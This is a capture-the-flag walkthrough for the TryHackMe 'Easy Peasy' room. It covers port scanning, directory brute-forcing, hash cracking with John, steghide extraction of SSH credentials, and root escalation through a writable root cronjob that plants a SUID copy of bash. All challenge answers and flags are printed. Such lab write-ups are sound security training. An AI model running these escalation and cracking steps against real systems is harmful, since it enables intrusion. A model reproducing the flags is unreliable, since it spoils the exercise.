
Link - "https://tryhackme.com/room/easypeasyctf"

> Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.

# Enumeration through Nmap

**Nmap Scan Result**
```shell

$ sudo nmap -sCV -p- 10.10.83.161

Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-26 20:06 BST
Nmap scan report for 10.10.83.161
Host is up (0.021s latency).
Not shown: 65532 closed tcp ports (reset)

PORT      STATE SERVICE VERSION

80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.16.1

6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 304a2b22acd95609f2da122057f46cd4 (RSA)
|   256 bf86c9c7b7ef8c8bb994ae0188c0854d (ECDSA)
|_  256 a172ef6c812913ef5a6c24034cfe3d0b (ED25519)

65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.77 seconds
```

**Q1. How many ports are open?**

`3`

**Q2. What is the version of nginx?**

`1.16.1`

**Q3. What is running on the highest port?**

`apache`

# Compromising the machine

```shell

gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u "http://10.10.83.161/"
```

```
/hidden               (Status: 301) [Size: 169] [--> http://10.10.83.161/hidden/]
/robots.txt           (Status: 200) [Size: 43]
```

```shell

gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u "http://10.10.83.161/hidden/"
```

```
/whatever             (Status: 301) [Size: 169] [--> http://10.10.83.161/hidden/whatever/]
```

`view-source:http://10.10.83.161/hidden/whatever/` , we can see a base64 encoding strings - `<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>`.

Base64 decodeed - `flag{f1rs7_fl4g}`

**Q4. Using GoBuster, find flag 1.**

`flag{f1rs7_fl4g}`

`http://10.10.83.161:65524/robots.txt`
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```


`User-Agent:a18672860d0510e5ab6699730763b250`, which is md5 encrytion.

After decryption we got - `a18672860d0510e5ab6699730763b250:flag{1m_s3c0nd_fl4g}`

**Q5. Further enumerate the machine, what is flag 2?**
	`flag{1m_s3c0nd_fl4g}`


`http://10.10.83.161:65524/`
```
They are activated by symlinking available configuration files from their respective Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312} *-available/ counterparts. These should be managed by using our helpers a2enmod, a2dismod, a2ensite, a2dissite, and a2enconf, a2disconf . See their respective man pages for detailed information.
```

**Q6. Crack the hash with easypeasy.txt, What is the flag 3?**
	`flag{9fdafbd64c47471a8f54cd3fc64cd312}`

`view-source:http://10.10.83.161:65524/`
```html

<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

**Cyber Chef** - Base62 decoded the above string.
	`/n0th1ng3ls3m4tt3r`

**Q7. What is the hidden directory?**
	`/n0th1ng3ls3m4tt3r`

`view-source:http://10.10.83.161:65524/n0th1ng3ls3m4tt3r/`
```html

<html>
<head>
<title>random title</title>
<style>
	body {
	background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
	background-color:black;
	}
</style>
</head>
<body>
<center>
<img src="[binarycodepixabay.jpg](view-source:http://10.10.83.161:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg)" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>
```

```shell

$ cat crack 
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81

$ sudo /opt/john/run/john --wordlist=easypeasy.txt --format=gost crack       
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Cracked 1 password hash (is in /opt/john/run/john.pot), use "--show"
No password hashes left to crack (see FAQ)

$ sudo /opt/john/run/john --show --format=gost crack
?:mypasswordforthatjob

1 password hash cracked, 0 left

```

**Q8. Using the wordlist that provided to you in this task crack the hash  What is the password?**
	mypasswordforthatjob

Well, now we have downloaded the above metioned jpg file. As from the clue we can guess there might me something hidden that image.

```shell

$ ls
binarycodepixabay.jpg

$ steghide extract -sf binarycodepixabay.jpg 
Enter passphrase: 
wrote extracted data to "secrettext.txt".

$ ls
binarycodepixabay.jpg  secrettext.txt

$ cat secrettext.txt 
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```
We used the last password from the above to get the hidden text.

"CyberChef" - To decrypt it from binary. We got this string - "iconvertedmypasswordtobinary".

**Q9. What is the password to login to the machine via SSH?**
	iconvertedmypasswordtobinary

Let's login - 

```shell

$ ssh boring@10.10.238.113 -p 6498

The authenticity of host '[10.10.238.113]:6498 ([10.10.238.113]:6498)' can't be established.
ED25519 key fingerprint is SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:22: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.238.113]:6498' (ED25519) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized	       **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
Enter passphrase for key '/home/tutu/.ssh/id_rsa': 
boring@10.10.238.113's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
boring@kral4-PC:~$ 
```
We got the flag.

**Q10. What is the user flag?**
	synt{a0jvgf33zfa0ez4y}

As mentioned in the description there is a vulnerable cronjob. So let's get these - 

```shell

boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

```

We can edit this file here. Let's add this line and modify the script - 

```
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash && chmod +x /tmp/bash
```

```shell

$ cd /tmp
boring@kral4-PC:/tmp$ ls
bash                                                                          systemd-private-8a661ffadd924978aa24bab228725062-systemd-resolved.service-jfNCfl
systemd-private-8a661ffadd924978aa24bab228725062-apache2.service-3BCFxD       systemd-private-8a661ffadd924978aa24bab228725062-systemd-timesyncd.service-la2Lql
systemd-private-8a661ffadd924978aa24bab228725062-ModemManager.service-zX37an
boring@kral4-PC:/tmp$ ./bash -p
bash-4.4# cd /root
bash-4.4# ls -la
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root  883 Jun 15  2020 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
bash-4.4# cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}

```

**Q11. What is the root flag?**
	flag{63a9f0ea7bb98050796b649e85481845}


! Happy Hacking !